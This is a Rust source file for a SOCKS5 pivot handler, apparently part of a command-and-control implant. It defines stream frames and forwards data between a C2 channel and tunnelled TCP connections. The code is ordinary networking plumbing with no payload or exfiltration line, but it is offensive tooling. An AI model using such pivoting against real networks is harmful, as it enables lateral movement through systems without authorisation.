use tokio::sync::mpsc;
use std::collections::HashMap;
use tokio::io::AsyncWriteExt;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::net::tcp::OwnedWriteHalf;

#[derive(Debug)]
pub enum PivotFrameType {
    Open,   // Open new connection
    Data,   // Data for a connection
    Close,  // Close connection
    Error,  // Error
}

#[derive(Debug)]
pub struct PivotFrame {
    pub stream_id: u32,
    pub frame_type: PivotFrameType,
    pub payload: Vec<u8>,
}


// Implementing the PivotFrame struct
impl PivotFrame {
    pub fn open(stream_id: u32, addr: String) -> Self {
        Self {
            stream_id,
            frame_type: PivotFrameType::Open,
            payload: addr.into_bytes(),
        }
    }
    pub fn data(stream_id: u32, data: Vec<u8>) -> Self {
        Self {
            stream_id,
            frame_type: PivotFrameType::Data,
            payload: data,
        }
    }
    pub fn close(stream_id: u32) -> Self {
        Self {
            stream_id,
            frame_type: PivotFrameType::Close,
            payload: vec![],
        }
    }
}

pub struct Socks5PivotHandler {
    streams: HashMap<u32, Arc<Mutex<OwnedWriteHalf>>>,
    c2_sender: mpsc::Sender<PivotFrame>,
}

// Implementing the Socks5PivotHandler struct
impl Socks5PivotHandler {
    pub fn new(c2_sender: mpsc::Sender<PivotFrame>) -> Self {
        Self {
            streams: HashMap::new(),
            c2_sender,
        }
    }

    pub fn register_stream(&mut self, stream_id: u32, writer: Arc<Mutex<OwnedWriteHalf>>) {
        self.streams.insert(stream_id, writer);
    }

    pub async fn handle_frame(&mut self, frame: PivotFrame) {
        log::info!(
            "[SOCKS5-PIVOT] Received frame: type={:?}, stream_id={}, payload_len={}",
            frame.frame_type, frame.stream_id, frame.payload.len()
        );
        match frame.frame_type {
            PivotFrameType::Data => {
                if let Some(stream) = self.streams.get(&frame.stream_id) {
                    let mut stream = stream.lock().await;
                    log::debug!("[SOCKS5-PIVOT] Writing {} bytes to stream {}", frame.payload.len(), frame.stream_id);
                    if let Err(e) = stream.write_all(&frame.payload).await {
                        log::error!(
                            "[SOCKS5-PIVOT] Failed to write {} bytes to stream {}: {}",
                            frame.payload.len(), frame.stream_id, e
                        );
                    }
                } else {
                    log::warn!("[SOCKS5-PIVOT] No stream found for stream_id {}", frame.stream_id);
                }
            }
            PivotFrameType::Close => {
                log::info!("[SOCKS5-PIVOT] Closing stream {}", frame.stream_id);
                self.streams.remove(&frame.stream_id);
            }
            _ => {}
        }
    }
}